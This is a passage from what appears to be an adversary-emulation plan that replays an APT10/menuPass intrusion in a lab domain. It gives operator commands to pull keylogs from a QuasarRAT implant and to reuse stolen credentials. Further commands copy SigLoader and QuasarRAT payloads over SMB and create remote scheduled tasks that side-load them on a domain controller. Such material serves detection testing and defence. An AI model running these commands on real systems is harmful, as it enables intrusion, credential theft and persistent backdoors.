<p><span class="docs-emoji">&#x23E9;</span> Resume red team activity</p>
</blockquote>
<ul>
<li><p>Using the first QuasarRAT on the IIS server <code v-pre>gabumon (10.10.10.9)</code>, retrieve
keylogs:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{&quot;type&quot;: 4}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Initiate a new RDP to the IIS server <code v-pre>gabumon (10.10.10.9)</code> using the
stolen credentials from Step 1.</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>DIGIRUNAWAY\kizumi</td>
<td>ydJEeqNzN4Xqkd9h@</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>Within the RDP to the IIS server <code v-pre>gabumon (10.10.10.9)</code>, open Command Prompt
with administrative privileges (if not already open) then execute the following
runas command, entering the kizumi.da password when prompted:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">runas /netonly /user:DIGIRUNAWAY\kizumi.da cmd.exe</code></pre>
</doc-codeblock></div>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>ydJEeqNzN4Xqkd9h@</td>
</tr>
</tbody>
</table>
</div>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<ol>
<li><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor">https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor</a></li>
<li><a href="https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934">https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934</a></li>
<li><a href="https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10">https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10</a></li>
<li><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/">https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/</a></li>
<li><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf">https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf</a></li>
<li><a href="https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html">https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html</a></li>
<li><a href="https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf">https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf</a></li>
<li><a href="https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-">https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-</a></li>
</ol>
 <details>
   <summary>:link: Click to expand source code links table</summary>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>Keylog domain admin credentials</td>
<td><a href="../../resources/quasar/quasar.client/logging/keylogger.cs">Keylogger</a></td>
<td>T1056.001 Input Capture: Keylogging</td>
<td><a href="https://github.com/quasar/Quasar" class="outbound" target="_blank"><span>Quasar Github</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>RDP to the IIS server</td>
<td>-</td>
<td>T1021.001 Remote Services: Remote Desktop Protocol</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage" class="outbound" target="_blank"><span>Symantec</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.justice.gov/archives/opa/page/file/1122671/download" class="outbound" target="_blank"><span>DOJ</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Authenticate with IIS admin credentials</td>
<td>-</td>
<td>T1078.002 Valid Accounts: Domain Accounts</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage" class="outbound" target="_blank"><span>Symantec</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.justice.gov/archives/opa/page/file/1122671/download" class="outbound" target="_blank"><span>DOJ</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Open Command Prompt</td>
<td>-</td>
<td>T1059.003 Command and Scripting Interpreter: Windows Command Shell</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Authenticate with domain admin credentials</td>
<td>-</td>
<td>T1078.002 Valid Accounts: Domain Accounts</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage" class="outbound" target="_blank"><span>Symantec</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.justice.gov/archives/opa/page/file/1122671/download" class="outbound" target="_blank"><span>DOJ</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
 </details>
<br>
<doc-anchor-target id="step-4---lateral-movement-to-subsidiary-a-domain-controller">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4---lateral-movement-to-subsidiary-a-domain-controller">#</doc-anchor-trigger>
        <span>Step 4 - Lateral Movement to Subsidiary A Domain Controller</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>Using the first QuasarRAT implant, menuPass downloads a second copy of
SigLoader/QuasarRAT to the IIS Server <code v-pre>gabumon (10.10.10.9)</code> then uses the
elevated Command Prompt to move the executable to the Subsidiary A Domain
Controller <code v-pre>parrotmon (10.10.10.4)</code>.</p>
<p>Using the elevated Command Prompt, menuPass uses the <code v-pre>schtasks</code> utility to
remotely create and run a scheduled task on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code> that executes a legitimate executable:
<code v-pre>Notepad++.exe</code>.</p>
<p>This legitimate executable executes SigLoader via DLL side-loading and results
in a second QuasarRAT implant on the Subsidiary A Domain Controller <code v-pre>parrotmon (10.10.10.4)</code>.
This second QuasarRAT implant will connect to the C2 server using a redirector at <code v-pre>notepad-plusplus-updates[.]eu (121.93.99.100)</code>.</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Using the QuasarRAT on the IIS Server <code v-pre>gabumon (10.10.10.9)</code>, download a second copy of
SigLoader/QuasarRAT components. <strong>Wait until each command has returned before executing the next</strong>.</p>
<ul>
<li><p>SigLoader layer 1</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{&quot;type&quot;: 2, &quot;transfer_src&quot;: &quot;C:\\menu_pass\\Resources\\payloads\\quasar\\DC_layer1.dll&quot;, &quot;transfer_dst&quot;: &quot;C:\\Users\\kizumi\\AppData\\Local\\Temp\\VERSION.dll&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>SigLoader layer 2</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{&quot;type&quot;: 2, &quot;transfer_src&quot;: &quot;C:\\menu_pass\\Resources\\payloads\\quasar\\DC_layer2.dll&quot;, &quot;transfer_dst&quot;: &quot;C:\\Users\\kizumi\\AppData\\Local\\Temp\\nhi.dll&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>FYAnti</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{&quot;type&quot;: 2, &quot;transfer_src&quot;: &quot;C:\\menu_pass\\Resources\\payloads\\quasar\\DC_fyanti.dll&quot;, &quot;transfer_dst&quot;: &quot;C:\\Users\\kizumi\\AppData\\Local\\Temp\\mshtmled.wpf.cfg&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>QuasarRAT</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{&quot;type&quot;: 2, &quot;transfer_src&quot;: &quot;C:\\menu_pass\\Resources\\payloads\\quasar\\Client.exe.enc&quot;, &quot;transfer_dst&quot;: &quot;C:\\Users\\kizumi\\AppData\\Local\\Temp\\ngen.old3.log&quot;}'</code></pre>
</doc-codeblock></div>
</li>
</ul>
</li>
<li><p>Return to the elevated Command Prompt on the IIS server <code v-pre>gabumon (10.10.10.9)</code>
and move the downloaded components to the Subsidiary A Domain Controller via
SMB.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">move C:\Users\kizumi\AppData\Local\Temp\VERSION.dll &quot;\\10.10.10.4\C$\Program Files\Notepad++\&quot;
move C:\Users\kizumi\AppData\Local\Temp\nhi.dll \\10.10.10.4\admin$\System32
move C:\Users\kizumi\AppData\Local\Temp\mshtmled.wpf.cfg \\10.10.10.4\admin$\Microsoft.NET
move C:\Users\kizumi\AppData\Local\Temp\ngen.old3.log \\10.10.10.4\admin$\Microsoft.NET\Framework64\v4.0.30319\</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the elevated Command Prompt on the IIS server <code v-pre>gabumon (10.10.10.9)</code>,
remotely create a scheduled task on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code> to execute a legitimate executable that sideloads
SigLoader.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">schtasks /create /s 10.10.10.4 /u DIGIRUNAWAY\kizumi.da /p ydJEeqNzN4Xqkd9h@ /tn &quot;Notepad++ Script&quot; /tr &quot;\&quot;C:\Program Files\Notepad++\notepad++.exe\&quot;&quot; /ru DIGIRUNAWAY\kizumi.da /rp ydJEeqNzN4Xqkd9h@ /rl HIGHEST /sc MINUTE /mo 15 /f</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the elevated Command Prompt on the IIS server <code v-pre>gabumon (10.10.10.9)</code>,
remotely run the scheduled task created on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">schtasks /run /s 10.10.10.4 /u DIGIRUNAWAY\kizumi.da /p ydJEeqNzN4Xqkd9h@ /tn &quot;Notepad++ Script&quot;</code></pre>
</doc-codeblock></div>
</li>
<li><p>Confirm C2 registration of a second QuasarRAT implant.</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<ol>
<li><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf">http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf</a></li>
<li><a href="https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf">https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf</a></li>
<li><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf">https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf</a></li>
</ol>
 <details>
   <summary>:link: Click to expand source code links table</summary>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>Download 2nd SigLoader/QuasarRAT (non-keylogging)</td>
<td><a href="../../resources/quasar/quasar.client/messages/filemanagerhandler.cs#L334">Execute File Download</a></td>
<td>T1105 Ingress Tool Transfer</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Use elevated Command Prompt</td>
<td>-</td>
<td>T1059.003 Command and Scripting Interpreter: Windows Command Shell</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Create scheduled task</td>
<td>-</td>
<td>T1603 Scheduled Task/Job</td>
<td><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf#page=30" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Run scheduled task</td>
<td>-</td>
<td>T1603 Scheduled Task/Job</td>
<td><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf#page=30" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Dropped files were modified to contain shellcode</td>
<td><a href="../../resources/sigloader/#sigflip">SigFlip documentation</a></td>
<td>T1027.009 Obfuscated Files or Information: Embedded Payloads</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Dropped files&#x27; signatures are still valid</td>
<td><a href="../../resources/sigloader/#sigflip">SigFlip documentation</a></td>
<td>T1553.002 Subvert Trust Controls: Code Signing</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:%7E:text=The%20%E2%80%98vac.dll%E2%80%99%20DLL%20file%20is%20signed%20with%20a%20valid%2C%20legitimate%20digital%20signature%2C%20although%20the%20file%20has%20been%20tampered%20with." class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Execute Notepad++.exe to perform DLL sideloading</td>
<td>-</td>
<td>T1574.002 Hijack Execution Flow: DLL Side-Loading</td>
